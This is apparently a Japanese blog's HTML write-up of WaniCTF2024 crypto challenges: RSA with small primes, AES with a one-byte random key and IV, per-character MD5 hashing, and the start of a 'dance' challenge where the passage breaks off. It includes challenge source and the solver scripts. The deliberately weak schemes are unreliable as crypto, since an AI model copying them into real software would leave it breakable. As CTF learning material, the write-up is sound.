@@ -1,0 +1,717 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>WaniCTF2024 // お茶は綾鷹派</title>
+    <link rel="shortcut icon" href="../../favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.117.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="KoheiDoi" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="../../css/main.min.3fb9065bb18f896621f7ce2fad5bbbafdf9954fbe571b5e41c6e59a8cbacc8ef.css" />
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="WaniCTF2024"/>
+<meta name="twitter:description" content="waniCTF に半日参加しました． 友達はいないのでソロです．
+writeup crypto beginners_rsa from Crypto.Util.number import * p = getPrime(64) q = getPrime(64) r = getPrime(64) s = getPrime(64) a = getPrime(64) n = p*q*r*s*a e = 0x10001 FLAG = b&#39;FLAG{This_is_a_fake_flag}&#39; m = bytes_to_long(FLAG) enc = pow(m, e, n) print(f&#39;n = {n}&#39;) print(f&#39;e = {e}&#39;) print(f&#39;enc = {enc}&#39;) Multi Prime RSA です． 与えられた n は簡単に素因数分解できるので，d が求まり，簡単に復号できます. 素因数分解はなんでもいいんですが今回は Msieve を使いました(参考).
+from Crypto.Util.number import inverse, long_to_bytes n = 317903423385943473062528814030345176720578295695512495346444822768171649361480819163749494400347 e = 0x10001 enc = 127075137729897107295787718796341877071536678034322988535029776806418266591167534816788125330265 p = 9953162929836910171 q = 11771834931016130837 r = 12109985960354612149 s = 13079524394617385153 a = 17129880600534041513 phi_n = (p - 1) * (q - 1) * (r - 1) * (s - 1) * (a - 1) d = inverse(e, phi_n) m = pow(enc, d, n) FLAG = long_to_bytes(m) print(FLAG) beginners_aes from Crypto."/>
+
+    <meta property="og:title" content="WaniCTF2024" />
+<meta property="og:description" content="waniCTF に半日参加しました． 友達はいないのでソロです．
+writeup crypto beginners_rsa from Crypto.Util.number import * p = getPrime(64) q = getPrime(64) r = getPrime(64) s = getPrime(64) a = getPrime(64) n = p*q*r*s*a e = 0x10001 FLAG = b&#39;FLAG{This_is_a_fake_flag}&#39; m = bytes_to_long(FLAG) enc = pow(m, e, n) print(f&#39;n = {n}&#39;) print(f&#39;e = {e}&#39;) print(f&#39;enc = {enc}&#39;) Multi Prime RSA です． 与えられた n は簡単に素因数分解できるので，d が求まり，簡単に復号できます. 素因数分解はなんでもいいんですが今回は Msieve を使いました(参考).
+from Crypto.Util.number import inverse, long_to_bytes n = 317903423385943473062528814030345176720578295695512495346444822768171649361480819163749494400347 e = 0x10001 enc = 127075137729897107295787718796341877071536678034322988535029776806418266591167534816788125330265 p = 9953162929836910171 q = 11771834931016130837 r = 12109985960354612149 s = 13079524394617385153 a = 17129880600534041513 phi_n = (p - 1) * (q - 1) * (r - 1) * (s - 1) * (a - 1) d = inverse(e, phi_n) m = pow(enc, d, n) FLAG = long_to_bytes(m) print(FLAG) beginners_aes from Crypto." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://side-realms.github.io/writeup/wanictf2024/" /><meta property="article:section" content="writeup" />
+<meta property="article:published_time" content="2024-06-25T18:50:04+09:00" />
+<meta property="article:modified_time" content="2024-06-25T18:50:04+09:00" />
+
+    <style>
+      .hr1 {
+  position: relative;
+	height: 3px;
+	border-width: 0;
+	background-color: #00bcd4;
+	background-image: -webkit-linear-gradient( 135deg, #FD6585 10%, #0D25B9 100%);
+	background-image: linear-gradient( 135deg, #FD6585 10%, #0D25B9 100%);
+}
+    </style>
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="http://side-realms.github.io"><img class="app-header-avatar" src="../../images/avatar.jpg" alt="KoheiDoi" /></a>
+      <span class="app-header-title">お茶は綾鷹派</span>
+      <p>最近は颯も好き</p>
+      <p><font size="1">内容の正確性は保証していません🐶</font></p>
+      <nav class="app-header-menu">
+          <font size="5">
+          <a class="app-header-menu-item" href="../../">Home</a>
+          </font>
+          <br>
+            
+          
+          <font size="5">
+          <a class="app-header-menu-item" href="../../log">life log</a>
+          </font>
+          <br>
+            
+          
+          <font size="5">
+          <a class="app-header-menu-item" href="../../treasure/">treasure trove</a>
+          </font>
+          <br>
+      </nav>
+
+      <hr class="hr1">
+      <nav class="app-header-menu">
+          <font size="4">
+          <a class="app-header-menu-item" href="../../sound">sound</a>
+          </font>
+          <br>
+            
+          
+          <font size="4">
+          <a class="app-header-menu-item" href="../../container">container</a>
+          </font>
+          <br>
+            
+          
+          <font size="4">
+          <a class="app-header-menu-item" href="../../hardware">hardware</a>
+          </font>
+          <br>
+            
+          
+          <font size="4">
+          <a class="app-header-menu-item" href="../../writeup">writeup</a>
+          </font>
+          <br>
+            
+          
+          <font size="4">
+          <a class="app-header-menu-item" href="../../other">other</a>
+          </font>
+          <br>
+      </nav>
+
+      <hr class="hr1">
+      <div class="app-header-social">
+        
+          <a href="https://github.com" target="_blank" rel="noreferrer noopener me">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+          <a href="https://twitter.com" target="_blank" rel="noreferrer noopener me">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
+  <title>Twitter</title>
+  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
+</svg>
+          </a>
+        
+      </div>
+      <div class="app-footer-copyright">
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">WaniCTF2024</h1>
+      </style>
+      <div class="post-meta">
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Jun 25, 2024
+        </div>
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          8 min read
+        </div>
+      </div>
+      <hr>
+    </header>
+    <div class="post-content">
+      <p>waniCTF に半日参加しました．
+友達はいないのでソロです．</p>
+<h1 id="writeup">writeup</h1>
+<h2 id="crypto">crypto</h2>
+<h3 id="beginners_rsa">beginners_rsa</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Util.number <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> getPrime(<span style="color:#ae81ff">64</span>)
+</span></span><span style="display:flex;"><span>q <span style="color:#f92672">=</span> getPrime(<span style="color:#ae81ff">64</span>)
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> getPrime(<span style="color:#ae81ff">64</span>)
+</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> getPrime(<span style="color:#ae81ff">64</span>)
+</span></span><span style="display:flex;"><span>a <span style="color:#f92672">=</span> getPrime(<span style="color:#ae81ff">64</span>)
+</span></span><span style="display:flex;"><span>n <span style="color:#f92672">=</span> p<span style="color:#f92672">*</span>q<span style="color:#f92672">*</span>r<span style="color:#f92672">*</span>s<span style="color:#f92672">*</span>a
+</span></span><span style="display:flex;"><span>e <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x10001</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>FLAG <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;FLAG</span><span style="color:#e6db74">{This_is_a_fake_flag}</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>m <span style="color:#f92672">=</span> bytes_to_long(FLAG)
+</span></span><span style="display:flex;"><span>enc <span style="color:#f92672">=</span> pow(m, e, n)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;n = </span><span style="color:#e6db74">{</span>n<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;e = </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;enc = </span><span style="color:#e6db74">{</span>enc<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span></code></pre></div><p>Multi Prime RSA です．
+与えられた n は簡単に素因数分解できるので，d が求まり，簡単に復号できます.
+素因数分解はなんでもいいんですが今回は <a href="https://sourceforge.net/projects/msieve/">Msieve</a> を使いました<a href="https://inaz2.hatenablog.com/entry/2016/01/09/032521">(参考)</a>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Util.number <span style="color:#f92672">import</span> inverse, long_to_bytes
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>n <span style="color:#f92672">=</span> <span style="color:#ae81ff">317903423385943473062528814030345176720578295695512495346444822768171649361480819163749494400347</span>
+</span></span><span style="display:flex;"><span>e <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x10001</span>
+</span></span><span style="display:flex;"><span>enc <span style="color:#f92672">=</span> <span style="color:#ae81ff">127075137729897107295787718796341877071536678034322988535029776806418266591167534816788125330265</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> <span style="color:#ae81ff">9953162929836910171</span>
+</span></span><span style="display:flex;"><span>q <span style="color:#f92672">=</span> <span style="color:#ae81ff">11771834931016130837</span>
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> <span style="color:#ae81ff">12109985960354612149</span>
+</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> <span style="color:#ae81ff">13079524394617385153</span>
+</span></span><span style="display:flex;"><span>a <span style="color:#f92672">=</span> <span style="color:#ae81ff">17129880600534041513</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>phi_n <span style="color:#f92672">=</span> (p <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> (q <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> (r <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> (s <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> (a <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>d <span style="color:#f92672">=</span> inverse(e, phi_n)
+</span></span><span style="display:flex;"><span>m <span style="color:#f92672">=</span> pow(enc, d, n)
+</span></span><span style="display:flex;"><span>FLAG <span style="color:#f92672">=</span> long_to_bytes(m)
+</span></span><span style="display:flex;"><span>print(FLAG)
+</span></span></code></pre></div><h3 id="beginners_aes">beginners_aes</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Util.Padding <span style="color:#f92672">import</span> pad
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> AES
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> os <span style="color:#f92672">import</span> urandom
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;the_enc_key_is_&#39;</span>
+</span></span><span style="display:flex;"><span>iv <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;my_great_iv_is_&#39;</span>
+</span></span><span style="display:flex;"><span>key <span style="color:#f92672">+=</span> urandom(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>iv <span style="color:#f92672">+=</span> urandom(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cipher <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>new(key, AES<span style="color:#f92672">.</span>MODE_CBC, iv)
+</span></span><span style="display:flex;"><span>FLAG <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;FLAG</span><span style="color:#e6db74">{This_is_a_dummy_flag}</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>flag_hash <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha256(FLAG)<span style="color:#f92672">.</span>hexdigest()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>msg <span style="color:#f92672">=</span> pad(FLAG, <span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>enc <span style="color:#f92672">=</span> cipher<span style="color:#f92672">.</span>encrypt(msg)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;enc = </span><span style="color:#e6db74">{</span>enc<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>) <span style="color:#75715e"># bytes object</span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;flag_hash = </span><span style="color:#e6db74">{</span>flag_hash<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>) <span style="color:#75715e"># str object</span>
+</span></span><span style="display:flex;"><span>print(key)
+</span></span></code></pre></div><p>鍵と初期ベクトルの最後 1 byte だけがランダムなのでここを総当たりすればいい</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Util.Padding <span style="color:#f92672">import</span> unpad, pad
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> AES
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Known parts of the key and IV</span>
+</span></span><span style="display:flex;"><span>known_key_part <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;the_enc_key_is_&#39;</span>
+</span></span><span style="display:flex;"><span>known_iv_part <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;my_great_iv_is_&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decrypt</span>(key, iv, msg):
+</span></span><span style="display:flex;"><span>   cipher <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>new(key, AES<span style="color:#f92672">.</span>MODE_CBC, iv)
+</span></span><span style="display:flex;"><span>   decrypted <span style="color:#f92672">=</span> unpad(cipher<span style="color:#f92672">.</span>decrypt(msg), <span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">return</span> decrypted
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>enc <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x16\x97</span><span style="color:#e6db74">,</span><span style="color:#ae81ff">\xa7\xfb</span><span style="color:#e6db74">_</span><span style="color:#ae81ff">\xf3\x15</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">\x87</span><span style="color:#e6db74">jKRaF&amp;&#34;</span><span style="color:#ae81ff">\xb6\xc4</span><span style="color:#e6db74">x</span><span style="color:#ae81ff">\xf4</span><span style="color:#e6db74">.K</span><span style="color:#ae81ff">\xd7</span><span style="color:#e6db74">7j</span><span style="color:#ae81ff">\xe5</span><span style="color:#e6db74">MLI_y</span><span style="color:#ae81ff">\xd9</span><span style="color:#e6db74">6</span><span style="color:#ae81ff">\xf1</span><span style="color:#e6db74">$</span><span style="color:#ae81ff">\xc5\xa3\x03\x99</span><span style="color:#e6db74">0Q^</span><span style="color:#ae81ff">\xc0\x17</span><span style="color:#e6db74">M2</span><span style="color:#ae81ff">\x18</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>flag_hash <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x6a96111d69e015a07e96dcd141d31e7fc81c4420dbbef75aef5201809093210e</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">256</span>):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">256</span>):
+</span></span><span style="display:flex;"><span>                key <span style="color:#f92672">=</span> known_key_part <span style="color:#f92672">+</span> bytes([i])
+</span></span><span style="display:flex;"><span>                iv <span style="color:#f92672">=</span> known_iv_part <span style="color:#f92672">+</span> bytes([j])
+</span></span><span style="display:flex;"><span>                <span style="color:#75715e">#enc = pad(enc, 16)</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>                        flag_hash_tmp <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha256(decrypt(key, iv, enc))<span style="color:#f92672">.</span>hexdigest()
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">if</span>(flag_hash <span style="color:#f92672">==</span> flag_hash_tmp):
+</span></span><span style="display:flex;"><span>                                print(key, iv)
+</span></span><span style="display:flex;"><span>                                print(decrypt(key, iv, enc))
+</span></span><span style="display:flex;"><span>                                print(<span style="color:#e6db74">&#34;OK&#34;</span>)
+</span></span><span style="display:flex;"><span>                                <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>                                print(<span style="color:#e6db74">&#34;No&#34;</span>)
+</span></span><span style="display:flex;"><span>                                print(i, j)
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">continue</span>
+</span></span></code></pre></div><h3 id="replacement">replacement</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> secret <span style="color:#f92672">import</span> cal
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>enc <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> char <span style="color:#f92672">in</span> cal:
+</span></span><span style="display:flex;"><span>    x <span style="color:#f92672">=</span> ord(char)
+</span></span><span style="display:flex;"><span>    x <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>md5(str(x)<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest()
+</span></span><span style="display:flex;"><span>    enc<span style="color:#f92672">.</span>append(int(x, <span style="color:#ae81ff">16</span>))
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;my_diary_11_8_Wednesday.txt&#39;</span>, <span style="color:#e6db74">&#39;w&#39;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>write(str(enc))
+</span></span></code></pre></div><p>大量のハッシュ値がありますが，日記から読み込んだ一文字ずつをハッシュしているだけなので総当たりで解けます</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> string
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> string<span style="color:#f92672">.</span>printable:
+</span></span><span style="display:flex;"><span>    x <span style="color:#f92672">=</span> ord(i)
+</span></span><span style="display:flex;"><span>    x <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>md5(str(x)<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(len(tmp)):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span>(str(x)<span style="color:#f92672">==</span>str(hex(tmp[j]))[<span style="color:#ae81ff">2</span>:]):
+</span></span><span style="display:flex;"><span>                        print(<span style="color:#e6db74">&#34;OK&#34;</span>)
+</span></span><span style="display:flex;"><span>                        tmp[j] <span style="color:#f92672">=</span> i
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(tmp))  
+</span></span></code></pre></div><h3 id="easy-culc">Easy culc</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> random
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> hashlib <span style="color:#f92672">import</span> md5
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> AES
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Util.number <span style="color:#f92672">import</span> long_to_bytes, getPrime
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>FLAG <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>getenvb(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;FLAG&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;FAKE{THIS_IS_NOT_THE_FLAG!!!!!!}&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encrypt</span>(m: bytes, key: int) <span style="color:#f92672">-&gt;</span> bytes:
+</span></span><span style="display:flex;"><span>    iv <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>urandom(<span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>    key <span style="color:#f92672">=</span> long_to_bytes(key)
+</span></span><span style="display:flex;"><span>    key <span style="color:#f92672">=</span> md5(key)<span style="color:#f92672">.</span>digest()
+</span></span><span style="display:flex;"><span>    cipher <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>new(key, AES<span style="color:#f92672">.</span>MODE_CBC, iv<span style="color:#f92672">=</span>iv)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> iv <span style="color:#f92672">+</span> cipher<span style="color:#f92672">.</span>encrypt(m)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">f</span>(s, p):
+</span></span><span style="display:flex;"><span>    u <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(p):
+</span></span><span style="display:flex;"><span>        u <span style="color:#f92672">+=</span> p <span style="color:#f92672">-</span> i
+</span></span><span style="display:flex;"><span>        u <span style="color:#f92672">*=</span> s
+</span></span><span style="display:flex;"><span>        u <span style="color:#f92672">%=</span> p
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> u
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> getPrime(<span style="color:#ae81ff">1024</span>)
+</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">1</span>, p <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>A <span style="color:#f92672">=</span> f(s, p)
+</span></span><span style="display:flex;"><span>ciphertext <span style="color:#f92672">=</span> encrypt(FLAG, s)<span style="color:#f92672">.</span>hex()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>p <span style="color:#e6db74">= }</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>A <span style="color:#e6db74">= }</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>ciphertext <span style="color:#e6db74">= }</span><span style="color:#e6db74">&#34;</span>)
+</span></span></code></pre></div><p>式変形は書くのが大変なので書かないが，<code>f</code> の中身を書き下すと以下のようになる．</p>
+<p>f(s,p) = A = sum(i*s^i) i=1~p</p>
+<p>このうえで，等比数列の部分和を求めればよいので Wolfram なりを使っていい感じに式変形してあげる．
+フェルマーの小定理より s^(p-1) mod p = 1, s^p mod p = s なので s が A であらわせるようになる．
+で，これを使えば AES 復号ができる</p>
+<h3 id="dance">dance</h3>
+<p>ログイン操作と暗号化操作がある．</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">Encrypt</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">global</span> isLogged
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">global</span> current_user
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> isLogged:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;You need to login first&#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span>    token <span style="color:#f92672">=</span> d[current_user]
+</span></span><span style="display:flex;"><span>    sha256 <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha256()
+</span></span><span style="display:flex;"><span>    sha256<span style="color:#f92672">.</span>update(token<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    key <span style="color:#f92672">=</span> sha256<span style="color:#f92672">.</span>hexdigest()[:<span style="color:#ae81ff">32</span>]
+</span></span><span style="display:flex;"><span>    nonce <span style="color:#f92672">=</span> token[:<span style="color:#ae81ff">12</span>]
+</span></span><span style="display:flex;"><span>    cipher <span style="color:#f92672">=</span> MyCipher(key<span style="color:#f92672">.</span>encode(), nonce<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    plaintext <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#39;Enter plaintext: &#39;</span>)
+</span></span><span style="display:flex;"><span>    ciphertext <span style="color:#f92672">=</span> cipher<span style="color:#f92672">.</span>encrypt(plaintext<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;username:&#39;</span>, current_user)
